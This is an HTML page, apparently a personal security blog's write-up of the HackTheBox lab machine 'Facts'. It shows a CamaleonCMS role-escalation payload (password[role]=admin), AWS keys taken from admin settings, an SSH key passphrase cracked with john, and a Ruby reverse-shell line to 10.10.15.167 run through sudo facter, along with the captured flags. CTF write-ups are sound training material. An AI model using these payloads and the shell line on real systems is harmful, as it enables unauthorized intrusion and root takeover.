@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Season10 - Writeups - Facts</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrix"></canvas>
+
+    <header>
+        <div class="header-content">
+            <div class="terminal-prompt">k0d14k@kali:~#</div>
+            <div class="img-text">
+                <img src="/static/images/avatar.png" width="100rem">
+                <div class="text">
+                    <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                    <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/#about">Whoami</a></li>
+            <li><a href="/#skills">Skills</a></li>
+            <li><a href="/#projects">Projects</a></li>
+            <li><a href="/#contact">Contacts</a></li>
+        </ul>
+    </nav>
+
+    <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/facts.png" alt="500rem">   
+        <h1>Facts - HTB Season 10</h1>
+
+        <p>
+            <b>Categories</b>: #authorization-bypass, #CVE-2025-2304, #aws, #ssh-key-crack, #facter-privilege-escalation
+        </p>
+
+        <hr>
+        <p>Facts is a HackTheBox machine released as the first machine of Season 10.</p>
+
+
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="nmap-scan-tcp">
+            <h2>cat nmap-scan-tcp</h2>
+            <div class="code">
+                # Nmap 7.95 scan initiated Sun Feb  1 16:57:58 2026 as: /usr/lib/nmap/nmap --privileged -sT -sV -oA facts-tcp facts.htb <br>
+                Nmap scan report for facts.htb (10.129.18.51) <br>
+                Host is up (0.14s latency). <br>
+                Not shown: 998 closed tcp ports (conn-refused) <br>
+                PORT   STATE SERVICE VERSION <br>
+                22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0) <br>
+                80/tcp open  http    nginx 1.26.3 (Ubuntu) <br>
+                Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel <br>
+<br>
+                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . <br>
+                # Nmap done at Sun Feb  1 16:58:27 2026 -- 1 IP address (1 host up) scanned in 28.75 seconds <br>
+            </div>
+
+            <p>
+                The TCP port enumeration phase is fairly straightforward, and scanning the first 1000 standard ports immediately reveals 
+                the presence of an <span class="highlight">nginx</span> web server on port 80. As usual, the FQDN resolution needs to be 
+                added to the <span class="highlight">/etc/hosts</span> file on our machine before proceeding:
+            </p>
+
+            <div class="code">
+                echo "10.129.18.51 facts.htb" | sudo tee -a /etc/hosts
+            </div>
+        </section>
+
+        <section id="web-exploit">
+            <h2>cat web-exploit</h2>
+
+            <p>Once the web portal is accessed, we are presented with a web application like the following:</p>
+
+            <img src="images/Pasted image 20260203113939.png" width="1000rem">
+
+            <p>Analyzing the various pages of the site, I discover that some of them contain comments:</p>
+
+            <img src="images/Pasted image 20260203114039.png" width="1000rem">
+
+            <p>I therefore assume that a login page exists somewhere, and indeed it doesn't take long to retrieve the path to an admin login form:</p>
+
+            <img src="images/Pasted image 20260203114200.png" width="1000rem">
+
+            <p>As can be seen in the screenshot above, it is possible to register a user on the application. I proceed to create the user 
+                <span class="highlight">kodiak:kodiak</span> and log in.</p>
+
+            <p>Once a session is established, I discover two key aspects:</p>
+            <ol>
+                <li>The user is created with a <span class="highlight">client</span> role, thus defining a priority among the site's different roles.</li>
+                <li>The website is built using a CMS called <span class="highlight">CamaleonCMS</span> (version <span class="highlight">2.9.0</span>), which is written in Ruby.</li>
+            </ol>
+
+            <p>
+                Through various Google searches, I find that this version of Camaleon is vulnerable to an authorization bypass that allows privilege escalation within the site.
+                This issue is tracked under <a target="_blank" href="https://www.tenable.com/security/research/tra-2025-09">CVE-2025-2304</a>. I use BurpSuite to craft a password change 
+                request that also includes the modification of the <span class="highlight">user[role]=admin</span> attribute. The explanation of the CVE is not very clear, 
+                and I needed a few requests (and a second account called kodiak2) to actually understand the exploit. The <span class="highlight">password</span> attribute is 
+                treated as the <span class="highlight">user</span> object, and the <span class="highlight">password</span> and <span class="highlight">password_confirm</span> 
+                fields are used to validate the password change. However, since it is treated as <span class="highlight">user</span>, we can inject the <span class="highlight">role</span> 
+                field directly into this object, obtaining the payload <span class="highlight">password[role]=admin</span>.
+            </p>
+
+            <img src="images/Pasted image 20260203122325.png" width="1000rem">
+
+            <p>At the end of the flow, it is necessary to refresh the page with <span class="highlight">CTRL+F5</span> to actually see the changes, 
+                but we will have become <span class="highlight">Administrator</span>.</p>
+
+            <img src="images/Pasted image 20260203122705.png" width="1000rem">
+
+            <p>As we can see in the screenshot, becoming site administrators gives us access to a whole range of settings. I therefore resume the enumeration phase on the 
+                newly available resources.</p>
+        </section>
+        
+        <section id="foothold">
+            <h2>cat foothold</h2>
+            <p>
+                Inside the <span class="highlight">Settings > General Site</span> menu, among others, there is a <span class="highlight">Filesystem Settings</span> submenu. 
+                In this menu entry I find an <span class="highlight">access key</span> and a <span class="highlight">secret key</span> for what appears to be a self-hosted AWS 
+                bucket. Local AWS buckets are common for development purposes. I therefore attempt to access the bucket with the recovered credentials using <span class="highlight">awscli</span>.
+            </p>
+
+            <img src="images/Pasted image 20260203123552.png" width="1000rem">
+
+            <p>
+                We are now able to access the exposed buckets through port <span class="highlight">54321</span> (the port was also recovered from the same configuration). 
+                However, since it is a local bucket, we need to specify the resource using the <span class="highlight">--endpoint-url</span> flag:
+            </p>
+
+            <img src="images/Pasted image 20260203123934.png" width="1000rem">
+
+            <p>
+                Noticing the presence of a bucket called <span class="highlight">internal</span>, I begin enumerating this repository until I come across a <span class="highlight">.ssh</span> 
+                folder containing the files <span class="highlight">authorized_keys</span> and <span class="highlight">id_ed25519</span>. I download both and notice that the 
+                key in the <span class="highlight">id_ed25519</span> file is indeed the one authorized for access. Two things are now needed:
+            </p>
+
+            <ol>
+                <li>The username of the user for whom the key was generated.</li>
+                <li>The encryption password of the key itself.</li>
+            </ol>
+
+            <p>The username is quickly obtained -- thanks to ChatGPT I get the command to extract it:</p>
+
+            <div class="code">ssh-keygen -y -f id_ed25519</div>
+
+            <p>
+                The only issue is that this command asks for the password. To get the password, we need the combination of two tools: <span class="highlight">ssh2john</span> 
+                and <span class="highlight">john</span>.
+            </p>
+
+            <p>The <span class="highlight">ssh2john</span> tool is used to create a file readable by John the Ripper:</p>
+
+            <img src="images/Pasted image 20260203124455.png" width="1000rem">
+
+            <p>The <span class="highlight">john</span> tool will then be used to crack the passphrase:</p>
+
+            <div class="code">
+                john id_ed25519_john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <br>
+                Using default input encoding: UTF-8 <br>
+                Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) <br>
+                Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes <br>
+                Cost 2 (iteration count) is 24 for all loaded hashes <br>
+                Will run 8 OpenMP threads <br>
+                Press 'q' or Ctrl-C to abort, almost any other key for status <br>
+                dragonballz      (id_ed25519)     <br>
+                1g 0:00:01:01 DONE (2026-02-02 11:14) 0.01628g/s 52.11p/s 52.11c/s 52.11C/s billy1..imissu <br>
+                Use the "--show" option to display all of the cracked passwords reliably <br>
+                Session completed.
+            </div>
+
+            <p>Now that we have the passphrase <span class="highlight">dragonballz</span>, we can extract the username:</p>
+
+            <div class="code">
+                ssh-keygen -y -f id_ed25519            <br>                         
+                Enter passphrase for "id_ed25519":  <br>
+                ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO63+ZOfdOUxMHK25Q0jF2yP4sd6IGVzOI2YwHwfWcEB trivia@facts.htb
+            </div>
+
+            <p>The initial access is therefore obtained with the command:</p>
+
+            <div class="code">ssh -i id_ed25519 trivia@facts.htb</div>
+
+            <p>
+                and passphrase <span class="highlight">dragonballz</span>. I immediately grab the first flag located at <span class="highlight">/home/william/user.txt</span>.
+            </p>
+
+            <div class="code">
+                trivia@facts:~$ cat /home/william/user.txt <br>
+                e35df59d40b4f526f542791636b5d946 <br>
+                trivia@facts:~$ 
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>cat privilege-escalation</h2>
+            <p>
+                The privilege escalation part is straightforward. Running <span class="highlight">sudo -l</span> reveals that I have permission to execute, as <span class="highlight">root</span> 
+                and without a password, the <span class="highlight">facter</span> tool, for which there is a known privilege escalation vector on GTFOBins at the following 
+                <a target="_blank" href="https://gtfobins.github.io/gtfobins/facter/#inherit">resource</a>
+            </p>
+
+            <p>I follow the guide step by step:</p>
+
+            <ol>
+                <li>
+                    I create a <span class="highlight">/tmp/kodiak</span> folder in which I place the <span class="highlight">root.rb</span> file containing the following Ruby 
+                    code: <span class="highlight">spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.15.167",1234))</span>.
+                </li>
+                <li>
+                    I run the facter command with <span class="highlight">sudo /usr/bin/facter --custom-dir=.</span> from inside the <span class="highlight">/tmp/kodiak</span> folder.
+                </li>
+            </ol>
+
+            <p>Facter will retrieve the first Ruby file present in the custom-dir and execute it. Running this file will give us a reverse shell as root.</p>
+
+            <div class="code">
+                nc -nvlp 1234 <br>
+                listening on [any] 1234 ... <br>
+                connect to [10.10.15.167] from (UNKNOWN) [10.129.23.157] 43708 <br>
+                cat /root/root.txt <br>
+                d93efc1c33c22bfcd7a76d53616b85cb
+            </div>
+        </section>
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> e35df59d40b4f526f542791636b5d946</h3>
+            <h3><b>Root Flag:</b> d93efc1c33c22bfcd7a76d53616b85cb</h3>
+        </section>
+
+    </main>
+
+
+    <footer>
+        <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+        <p>&copy; 2025 K0D14K</p>
+    </footer>
+
+    <script src="/static/script.js"></script>
+    <script> lister() </script>
+</body>
